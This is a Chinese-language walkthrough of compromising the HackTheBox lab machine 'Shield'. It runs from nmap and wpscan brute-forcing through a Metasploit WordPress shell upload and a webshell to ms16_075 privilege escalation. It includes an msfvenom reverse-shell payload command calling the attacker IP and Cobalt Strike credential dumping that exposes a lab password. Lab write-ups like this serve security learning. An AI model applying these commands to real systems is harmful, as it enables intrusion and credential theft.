# Shield



-   靶机： `10.10.10.29`
-   攻击机：`10.10.14.88`



## 信息收集



```shell
└─# nmap 10.10.10.29 -A                                                                                                                                                    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 21:49 EST
Nmap scan report for 10.10.10.29
Host is up (0.24s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3306/tcp open  mysql   MySQL (unauthorized)
```

3306 mysql不允许远程登录，无法爆破，入口点只有80端口



## web

上来就是一个iis，很快啊

![image-20210302105122136](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302105122136.png)

### dirsearch

我一个`dirsearch`，都找到了啊

![image-20210302105308625](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302105308625.png)



### wpscan

祭出`wordpress`的渗透神器`wpscan`，找用户名，并爆破

`wpscan --url http://10.10.10.29/wordpress/ --passwords /usr/share/wordlist/rockyou.txt`

![image-20210302105646571](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302105646571.png)

转念一想，前几个都有联动，这个会没有？拿出上道题的密码`P@s5w0rd!`

好家伙，进了后台

![image-20210302105837375](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302105837375.png)



### msf

有多种方式getshell，比如说

-   插件

    -   Wordpress 支持自定义插件
    -   msf存在模块 `exploit/unix/webapp/wp_admin_shell_upload`，可以直接利用插件。

-   修改源码

    -   在外观->编辑器处可以修改php源码，直接留webshell，在这个站我测试的时候留了一句话木马，结果出现了问题。

        ![image-20210302130127180](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302130127180.png)

        ![image-20210302130815893](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302130815893.png)

        总之就是不太行。

所以还是msf好用，如下设置参数：

![image-20210302131005569](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302131005569.png)

<font color='red'>上面的lhost应该写入自己的ip，不能用0.0.0.0，会出错，懒得改了，就这样了</font>

得到一个shell，并上传一句话木马

![image-20210302131326846](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302131326846.png)

使用蚁剑连接

![image-20210302131514532](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302131514532.png)



## 提权

Windows的提权可以使用msf下的一个模块`post/multi/recon/local_exploit_suggester`

![image-20210302131618990](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302131618990.png)

但是这个必须要一个Windows的`meterpreter session`，用

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.88 LPORT=8848 -f exe > msf_x64.exe`

生成一个payload，上传到服务器上，msf打开`handler`，执行木马，得到一个会话

![image-20210302132104042](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302132104042.png)

使用`suggester`

![image-20210302133113265](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302133113265.png)

说可以用`ms16_075`提权

![image-20210302133253493](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302133253493.png)

结果却失败了，但是确实说了是**vulnerable**，所以应该是参数不对

这里有个参数是`clsid`

>   https://blog.csdn.net/wmnmtm/article/details/82922028

<font color='red'>目前还不知道在`ms16_075`中这个id是干啥的，找不到相关资料。盲猜是写入了特定的id，改变了权限</font>

网上找了一下其他的`clsid`

>    https://www.cnblogs.com/hookjoy/p/12460089.html

目标系统是**windows 2016**

![image-20210302133833707](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302133833707.png)

选了 **{42C21DF5-FB58-4102-90E9-96A213DC7CE8}**，再次`exploit`，成功

![image-20210302134011551](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302134011551.png)



flag：![image-20210302134131022](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302134131022.png)



## 后话

后来翻了翻wp，发现最后有一步导出密码的操作，在下一个机子有用，那就顺便学习一下cs

上传cs_x64的马，system上线

![image-20210302134509016](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302134509016.png)



```shell
beacon> sleep 1
[*] Tasked beacon to sleep for 1s
beacon> shell whoami
[*] Tasked beacon to run: whoami
[+] host called home, sent: 53 bytes
[+] received output:
nt authority\system
```

用 [梼杌](https://github.com/pandasec888/taowu-cobalt-strike)插件的凭证获取

![image-20210302134832578](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302134832578.png)

导出用户**sandra**的密码 **Password1234!**，域名：**MEGACORP.LOCAL**

![image-20210302134943182](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302134943182.png)



直接使用`net time /domain`去请求域会失败，猜测可能是没有接入域吧。

![image-20210302135113724](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302135113724.png)

 

## 反思

Windows提权的手段又多了一点，知识面慢慢打开。

脚本小子初养成。

